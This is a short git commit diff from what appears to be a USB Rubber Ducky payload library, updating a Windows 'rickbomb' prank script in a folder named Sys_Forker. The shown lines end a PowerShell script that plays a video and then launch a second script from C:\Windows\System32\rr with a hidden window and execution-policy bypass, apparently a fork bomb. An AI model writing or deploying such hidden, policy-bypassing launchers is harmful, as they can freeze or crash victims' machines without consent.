52ac026ece2edffbf27487d093d64eeef96f57cd
FalsePhilosopher <joshgarland90@gmail.com>
2022-08-15 12:57:19 -0600

    update rickbomb

--- Ducky/USBRubberducky/library/prank/Win/Bombs/Sys_Forker/rr/rr.ps1
+++ Ducky/USBRubberducky/library/prank/Win/Bombs/Sys_Forker/rr/rr.ps1
@@ -32,4 +32,4 @@ $VideoPlayer.Play()
 #Show Up the Window 
 $Window.ShowDialog() | out-null
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -Exec Bypass '& C:\Windows\System32\rr\fb.ps1'"
+powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1
